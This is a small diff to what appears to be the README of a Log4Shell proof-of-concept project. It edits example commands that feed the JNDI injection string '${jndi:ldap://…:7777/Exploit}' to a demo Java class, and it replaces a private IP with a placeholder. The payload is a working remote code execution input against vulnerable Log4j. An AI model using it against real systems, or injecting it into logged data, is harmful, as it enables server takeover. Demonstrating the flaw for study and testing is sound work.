@@ -35,7 +35,7 @@ java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://localhost:8888/Exp
 
 ```bash
 java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://localhost:7777/Exploit}'
-java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://192.168.65.214:7777/Exploit}'
+java -cp $CLASSPATH au.com.tyo.logpoc.Innocent '${jndi:ldap://192.168.x.x:7777/Exploit}'
 
 ```
 ## Maintainer 
